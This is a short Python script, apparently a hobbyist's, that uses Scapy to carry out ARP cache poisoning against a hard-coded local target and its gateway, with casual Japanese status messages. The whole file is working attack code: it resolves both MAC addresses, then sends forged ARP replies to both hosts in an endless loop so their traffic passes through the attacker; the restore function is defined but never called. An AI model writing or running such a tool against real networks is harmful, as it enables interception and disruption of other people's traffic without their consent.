#!/usr/bin/env python
# -*- coding: utf-8 -*-

from scapy.all import *
import os
import sys
import threading


def get_mac(ip_addr):
	res,no_res = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_addr),timeout=2,retry=10)
	for s,r in res:
		return r[Ether].src
	return None

def table_clean(target_gw,tgw_mac,target_ip,tip_mac):
	print("[*] arp中です")
	send(ARP(op=2,psrc=target_gw,pdst=target_ip,hwdst="ff:ff:ff:ff:ff:ff",hwsrc=tgw_mac),count=5)
	send(ARP(op=2,psrc=target_ip,pdst=target_gw,hwdst="ff:ff:ff:ff:ff:ff",hwsrc=tip_mac),count=5)


def defile(target_gw,tgw_mac,target_ip,tip_mac):
	defile_target = ARP()
	defile_target.op   = 2
	defile_target.psrc = target_gw
	defile_target.pdst = target_ip
	defile_target.hwdst= tip_mac

	defile_gateway = ARP()
	defile_gateway.op   = 2
	defile_gateway.psrc = target_ip
	defile_gateway.pdst = target_gw
	defile_gateway.hwdst= tgw_mac
	
	while True:
		send(defile_target)
		send(defile_gateway)

	print("[*] arpテーブルを汚してきたよ完了しタオ")
	return


if __name__ == "__main__":
	

	target_ip = "192.168.179.6"
	target_gw = "192.168.179.1"

	tip_mac = get_mac(target_ip)

	if tip_mac is None:
        	print("Target_IPが間違ってるっぽいぞ")
        	sys.exit(0)

	tgw_mac = get_mac(target_gw)

	if tgw_mac is None:
        	print("Target_gwがまちがってるっぽい")
        	sys.exit(0)

	
 
	defile(target_gw,tgw_mac,target_ip,tip_mac)
